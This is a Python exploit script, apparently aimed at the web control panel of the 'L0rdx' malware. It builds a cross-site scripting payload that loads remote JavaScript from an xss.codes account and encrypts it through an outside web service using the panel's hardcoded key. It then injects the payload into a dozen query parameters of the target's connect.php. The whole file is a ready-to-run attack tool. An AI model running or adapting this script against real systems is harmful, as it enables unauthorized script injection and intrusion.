#!/usr/bin/python3

import requests
import argparse
import os
import base64

parser = argparse.ArgumentParser(description="L0rdx Panel XSS Exploit")
parser.add_argument('-t', '--target', help='Target Panel /connect.php')
parser.add_argument('-u', '--user', help='XSS.CODES Username')
parser.add_argument('-e', '--enc', default = "3sc3RLrpd17" ,help='L0rdx Encryption Key')

args = parser.parse_args()

def Clear():
	os.system("clear")

    
def Helprr():
    parser.print_help()
    exit(1)


def S2s():
    Clear()
    print("""

 __  __       _                       
|  \/  | __ _| |_      ___ __ ___ ___ 
| |\/| |/ _` | \ \ /\ / / '__/ __/ __|
| |  | | (_| | |\ V  V /| | | (_| (__ 
|_|  |_|\__,_|_| \_/\_/ |_|(_)___\___|
                               

""")



def Payloadgen(key,user):
	payload = "'><sCriPt sRC=https://xss.codes/s/" + user + "></sCRiPT>"
	encodedBytes = base64.b64encode(payload.encode("utf-8"))
	b64payload = str(encodedBytes, "utf-8")
	r = requests.get('https://www.js-get.gq/mwtools/l0rdxenc.php?key='+ b64payload +'&enckey=' + key) # AES Encryption
	encpayload = r.text
	return encpayload

	
	
def Exploit(target,payload):
    trgt = target + "?h=" + payload + "&o=" + payload + "&c=" + payload + "&g=" + payload + "&w=" + payload + "&p=" + payload + "&r=" + payload + "&d=" + payload + "&f=" + payload + "&w=" + payload + "&h=" + payload + "&t=" + payload
    s = requests.Session()
    s.get(trgt)
    print("[i] Payloads Sended..")
    exit(1)



def main():
    try:
        target = args.target
        user = args.user
        key= args.enc
        payload = Payloadgen(key,user)
        S2s()
        print("")
        print("[+] Payload Generated => " + payload)
        Exploit(target,payload)

    except Exception as e:
        S2s()
        Helprr()
        print(e)

if __name__ == '__main__':
    exit(main())
